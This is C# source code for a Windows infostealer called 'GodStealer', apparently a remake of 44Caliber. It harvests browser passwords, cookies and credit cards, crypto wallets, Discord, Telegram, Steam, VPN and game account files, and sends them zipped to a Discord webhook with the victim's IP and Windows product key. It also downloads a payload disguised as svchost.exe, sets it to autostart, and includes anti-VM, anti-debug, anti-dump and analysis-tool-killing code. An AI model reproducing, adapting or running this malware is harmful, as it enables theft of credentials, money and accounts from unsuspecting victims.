using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.NetworkInformation;
using System.Text;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net;
//Re-maded by Sahyui | Working 27.01.2022 | Success | 44Caliber |
namespace GodStealer
{
    class Program
    {
        public static void Main(string[] args)
        {
            if (!File.Exists(Help.ExploitDir)) 
            {
                if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1) 
                {
                    try
                    {
                        // Open Resources - > Discord - > DiscordWebhook.cs | Change webhook \\
                        string autostartfilename = "svchost.exe";
                        string DownloadLink = "Downloading file for autostart";
                        string URL = "Your Webhook";
                        WebRequest wr = WebRequest.Create(URL); //Create WebRequest
                        wr.Proxy = null; //This's the method to bypass missconfigured fiddler, fiddler need proxy to intercept/debug if proxy = null, can't intercept
                        string html = new System.IO.StreamReader(wr.GetResponse().GetResponseStream()).ReadToEnd(); //get Html




                        int[] sectiontabledwords = new int[] { 0x8, 0xC, 0x10, 0x14, 0x18, 0x1C, 0x24 };
                        int[] peheaderbytes = new int[] { 0x1A, 0x1B };
                        int[] peheaderwords = new int[] { 0x4, 0x16, 0x18, 0x40, 0x42, 0x44, 0x46, 0x48, 0x4A, 0x4C, 0x5C, 0x5E };
                        int[] peheaderdwords = new int[] { 0x0, 0x8, 0xC, 0x10, 0x16, 0x1C, 0x20, 0x28, 0x2C, 0x34, 0x3C, 0x4C, 0x50, 0x54, 0x58, 0x60, 0x64, 0x68, 0x6C, 0x70, 0x74, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x11C };

                        //antivirustotal bypass (some work just)
                        bool IsVirusTotal()
                        {
                            if (Environment.UserName == "admin" && Environment.MachineName == "WORK" && Environment.CommandLine == $"\"{AppDomain.CurrentDomain.FriendlyName}\"") return true;
                            else if (Environment.UserName == "John" && Environment.MachineName.StartsWith("WIN") && Environment.CommandLine == $"c:\\Users\\John\\Downloads\\\"{AppDomain.CurrentDomain.FriendlyName}\"") return true;
                            return false;
                        }
                        //if / ban
                        {
                            if (IsVirusTotal())
                                Environment.Exit(0);
                        }

                        //antidebug
                        void EraseSection(IntPtr address, int size)
                        {
                            IntPtr sz = (IntPtr)size;
                            IntPtr dwOld = default(IntPtr);
                            VirtualProtect(address, sz, (IntPtr)0x40, ref dwOld);
                            ZeroMemory(address, sz);
                            IntPtr temp = default(IntPtr);
                            VirtualProtect(address, sz, dwOld, ref temp);
                        }

                        void AntiDump()
                        {
                            var process = System.Diagnostics.Process.GetCurrentProcess();
                            var base_address = process.MainModule.BaseAddress;
                            var dwpeheader = System.Runtime.InteropServices.Marshal.ReadInt32((IntPtr)(base_address.ToInt32() + 0x3C));
                            var wnumberofsections = System.Runtime.InteropServices.Marshal.ReadInt16((IntPtr)(base_address.ToInt32() + dwpeheader + 0x6));

                            EraseSection(base_address, 30);

                            for (int i = 0; i < peheaderdwords.Length; i++)
                            {
                                EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + peheaderdwords[i]), 4);
                            }

                            for (int i = 0; i < peheaderwords.Length; i++)
                            {
                                EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + peheaderwords[i]), 2);
                            }

                            for (int i = 0; i < peheaderbytes.Length; i++)
                            {
                                EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + peheaderbytes[i]), 1);
                            }

                            int x = 0;
                            int y = 0;

                            while (x <= wnumberofsections)
                            {
                                if (y == 0)
                                {
                                    EraseSection((IntPtr)((base_address.ToInt32() + dwpeheader + 0xFA + (0x28 * x)) + 0x20), 2);
                                }

                                EraseSection((IntPtr)((base_address.ToInt32() + dwpeheader + 0xFA + (0x28 * x)) + sectiontabledwords[y]), 4);

                                y++;

                                if (y == sectiontabledwords.Length)
                                {
                                    x++;
                                    y = 0;
                                }
                            }
                        }







                        //when its open kill it.
                        List<string> ProcessName = new List<string> { "ProcessHacker", "taskmgr", "netstat", "netmon", "tcpview", "wireshark",
                "filemon", "regmon", "cain", "httpdebugger", "http debugger", "fiddler", "fiddler4"};






                        void RunAntiAnalysis()
                        {
                            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
                                Environment.FailFast(null);

                            while (true)
                            {
                                DetectProcess();
                                Thread.Sleep(10);
                                Thread.Sleep(25000);

                            }
                        }
                        //
                        bool DetectVirtualMachine()
                        {
                            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                            {
                                using (var items = searcher.Get())
                                {
                                    foreach (var item in items)
                                    {
                                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                                            || manufacturer.Contains("vmware")
                                            || item["Model"].ToString() == "VirtualBox")
                                        {
                                            return true;
                                        }
                                    }
                                }
                            }
                            return false;
                        }
                        //


                        //

                        bool DetectDebugger()
                        {
                            bool isDebuggerPresent = false;
                            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                            return isDebuggerPresent;
                        }
                        //



                        //

                        bool DetectSandboxie()
                        {
                            string[] dlls = new string[5]
  {
                "SbieDll.dll",
                "SxIn.dll",
                "Sf2.dll",
                "snxhk.dll",
                "cmdvrt32.dll"
  };
                            foreach (string dll in dlls)
                                if (GetModuleHandle(dll).ToInt32() != 0)
                                    return true;
                            return false;
                        }

                        ///

                        void DetectProcess()
                        {
                            foreach (Process process in Process.GetProcesses())
                            {
                                try
                                {
                                    if (ProcessName.Contains(process.ProcessName))
                                        process.Kill();
                                }
                                catch { }
                            }
                        }

                        //



                        //sa

 







 



                        //
                        void exportRegistry(string registryPath, string exportPath)
                        {
                            try
                            {
                                Process p = new Process();
                                p.StartInfo.FileName = "reg.exe";
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.StartInfo.CreateNoWindow = true;
                                p.StartInfo.Arguments = "export \"" + registryPath + "\" \"" + exportPath + "\" /y";
                                p.Start();
                                p.WaitForExit();
                            }
                            catch
                            {

                            }
                        }
                        //stealer
                        Directory.CreateDirectory(Help.ExploitDir);
                        List<Thread> Threads = new List<Thread>();

                        Threads.Add(new Thread(() => Browsers.Start()));

                        Threads.Add(new Thread(() => Files.GetFiles())); 

                        Threads.Add(new Thread(() => StartWallets.Start())); 

                        Threads.Add(new Thread(() =>
                        {
                            Help.Ethernet(); 
                            Screen.GetScreen(); 
                            ProcessList.WriteProcesses(); 
                            SystemInfo.GetSystem(); 
                        }));

                        Threads.Add(new Thread(() =>
                        {
                            ProtonVPN.Save();
                            OpenVPN.Save();
                            NordVPN.Save();
                            Steam.SteamGet();
                        }));

                        Threads.Add(new Thread(() =>
                        {
                            Discord.WriteDiscord();
                            FileZilla.GetFileZilla();
                            Telegram.GetTelegramSessions();
                            Vime.Get();
                        }));

                        foreach (Thread t in Threads)
                            t.Start();
                        foreach (Thread t in Threads)
                            t.Join();

                        string zipArchive = Help.ExploitDir + "\\" + "44.Sahyui";
                        using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile(Encoding.GetEncoding("cp866"))) 
                        {
                            zip.ParallelDeflateThreshold = -1;
                            zip.UseZip64WhenSaving = Ionic.Zip.Zip64Option.Always;
                            zip.CompressionLevel = Ionic.Zlib.CompressionLevel.Default; 
                            zip.Comment =
                           "\n ================================================" +
                           "\n ==================Sahyui#1337==================" +
                           "\n ================================================" +
                           "\n Re-maded by Sahyui#1337 | https://dsc.gg/sahyui1337" +
                           "\n                        " +
                            "\n Written exclusively for educational purposes! I am not responsible for the use of this project and any of its parts code.";
                            zip.Password = Config.zipPass;
                            zip.AddDirectory(Help.ExploitDir);
                            zip.Save(zipArchive);    
                        }

                        string mssgBody =
                            "Zip password is : " + Config.zipPass +
                            "\n :warning: Please join our community : https://dsc.gg/sahyui1337" +
                           "\n :spy: NEW LOG FROM - " + Environment.MachineName + " " + Environment.UserName + " :person_in_manual_wheelchair:" +
                           "\n :eye: IP: " + SystemInfo.IP() + " " + SystemInfo.Country() +
                           "\n :desktop: " + SystemInfo.GetSystemVersion() +
                           "\n :warning: StartUP Added success" +
                           "\n ================================" +
                           "\n: :warning: Windows product key" + Counting.ProductKey +
                           "\n :warning: Windows product key (V2)" + ProductKey.GetWindowsProductKeyFromRegistry() +
                           "\n :key: Passwords - " + Counting.Passwords +
                           "\n :cookie: Cookies - " + Counting.Cookies +
                           "\n :smile: History - " + Counting.History +
                           "\n :notepad_spiral: AutoFills - " + Counting.AutoFill +
                           "\n :credit_card: CC - " + Counting.CreditCards +
                           "\n :file_folder: Grabbed Files - " + Counting.FileGrabber +
                           "\n ================================" +
                           "\n GRABBED SOFTWARE:" +
                           (Counting.Discord > 0 ? "\n   Discord" : "") +
                           (Counting.Wallets > 0 ? "\n   Wallets" : "") +
                           (Counting.Telegram > 0 ? "\n   Telegram" : "") +
                           (Counting.FileZilla > 0 ? "\n   FileZilla" + " (" + Counting.FileZilla + ")" : "") +
                           (Counting.Steam > 0 ? "\n   Steam" : "") +
                           (Counting.NordVPN > 0 ? "\n   NordVPN" : "") +
                           (Counting.OpenVPN > 0 ? "\n   OpenVPN" : "") +
                           (Counting.ProtonVPN > 0 ? "\n   ProtonVPN" : "") +
                           (Counting.VimeWorld > 0 ? "\n   VimeWorld" + (Config.VimeWorld == true ?
                           $":\n     NickName - {Vime.NickName()} " +
                           $":\n     Donate - {Vime.Donate()} " +
                           $":\n     Level - {Vime.Level()}" : "") : "") +
                           "\n ================================" +
                           "\n DOMAINS DETECTED:" +
                           "\n - " + URLSearcher.GetDomainDetect(Help.ExploitDir + "\\Browsers\\");

                        //

                        string filename = Environment.MachineName + "." + Environment.UserName + ".zip";
                        string fileformat = "zip";
                        string filepath = zipArchive;
                        string application = "";

                        try
                        {
                            DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Отправка лога в дискорд
                        }
                        catch
                        {

                            DiscordWebhook.Send("Log size is more then 8 MB. Sending isn`t available.");
                      }
                        //get mac

                        string mac = ""; //not like thec0mpany one :D | 
                        foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                        {

                            if (nic.OperationalStatus == OperationalStatus.Up && (!nic.Description.Contains("Virtual") && !nic.Description.Contains("Pseudo")))
                            {
                                if (nic.GetPhysicalAddress().ToString() != "")
                                {
                                    mac = nic.GetPhysicalAddress().ToString();
                                }
                            }
                        }

                        //
                        //lunar
                        string lunar = "accounts.json";
                        string lunarb = "Lunar Client informations";
                        string lunarc = "json";
                        string lunard = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.lunarclient\\settings\\game\\accounts.json";
                        string lunare = " ";
                        try
                        {
                            DiscordWebhook.SendFile(lunarb, lunar, lunarc, lunard, lunare);
                        }
                        catch
                        {
                            DiscordWebhook.Send("This user didnt have Lunar Client");
                        }
                        //growtopia
                        string filenamea = "save.dat";
                        string msgbodyy = "From This mac : " + mac;
                        string fileformata = "dat";
                        string filepatha = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
                        string applicationa = " ";

                        try
                        {
                            DiscordWebhook.SendFile(msgbodyy, filenamea, fileformata, filepatha, applicationa);
                        }
                        catch
                        {
                            DiscordWebhook.Send("This user didnt have save.dat");
                        }

                        //pixel worlds stealer
                        string reg = @"HKEY_CURRENT_USER\SOFTWARE\Kukouri\Pixel Worlds";
                        string export = Path.GetTempPath() + @"\Account.reg";
                        exportRegistry(reg, export);
                       
                        string filenameaa = "Account.reg";
                        string msgbodyya = "From This mac : " + mac;
                        string fileformataa = "reg";
                        string filepathaa = export;
                        string applicationaa = " ";

                        try
                        {
                            DiscordWebhook.SendFile(msgbodyya, filenameaa, fileformataa, filepathaa, applicationaa);
                        }
                        catch
                        {
                            DiscordWebhook.Send("This user didnt have Account.reg (PW)");
                        }

                        //DROPPER  && STARTUP
                        //Found something for drop files to here
                        DiscordWebhook.Send("Download file : Success");       
                        WebClient webClient = new WebClient();
                        webClient.DownloadFile(DownloadLink, @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\svchost.exe");
                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        key.SetValue(autostartfilename, @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\svchost.exe");








                        Finish(); 
                        RunAntiAnalysis();
                        AntiDump();
                    }

                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
            }
        }

        static void Finish()
        {
            Thread.Sleep(15000);
            Directory.Delete(Help.ExploitDir + "\\", true);
            Environment.Exit(0);
        }

        [STAThread]

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern IntPtr VirtualProtect(IntPtr lpAddress, IntPtr dwSize, IntPtr flNewProtect, ref IntPtr lpflOldProtect);

        internal static class NativeMethods
        {
            [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode)]
            internal static extern IntPtr GetModuleHandle(string lpModuleName);
        }

        

    }
}
